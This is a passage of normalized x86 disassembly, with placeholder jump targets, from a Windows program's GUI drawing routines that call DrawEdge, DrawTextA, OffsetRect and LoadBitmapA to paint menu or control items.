call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45fdc4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45ffa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_461d5c
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404144
test bh 0x4
je r-xdata
mov eax edi
call sub_463398
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424cdc
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404374
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_4246b4
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_4246c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ffaf
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0xc ]
call sub_40456c
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4243f4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0xc ]
call sub_40456c
push eax
mov eax [ ebp - 0x4 ]
call sub_425648
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_4243f4
mov eax 0xff00000d
call sub_423f34
mov esi eax
mov eax 0xff000010
call sub_423f34
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_4243f4
jmp r-xdata
sub_460014
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4608fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424bc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4243f4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424bc0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45cdd8
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424bc0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_46045b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428f08
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4243f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45cdd8
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424bc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bb8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429f0c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424b94
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425370
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45d0c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424bc0
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45fdc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4246c0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_425178
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4243f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032b0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45fdc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460903
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45ee88
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45fdc4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_46091c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_461224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424bc0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4243f4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4044b8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424bc0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425224
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45cdd8
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425648
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
